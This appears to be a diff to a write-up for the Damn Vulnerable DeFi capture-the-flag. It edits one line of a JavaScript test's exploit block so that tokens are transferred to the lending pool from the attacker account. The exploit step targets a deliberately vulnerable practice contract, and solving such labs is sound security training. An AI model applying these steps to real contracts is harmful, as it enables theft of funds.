@@ -36,7 +36,7 @@ Visit [damnvulnerabledefi.xyz](https://damnvulnerabledefi.xyz)
     ```javascript=
      it('Exploit', async function () {
             /** CODE YOUR EXPLOIT HERE */
-            await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+            await this.token.connect(attacker).transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
 
         });
     ```
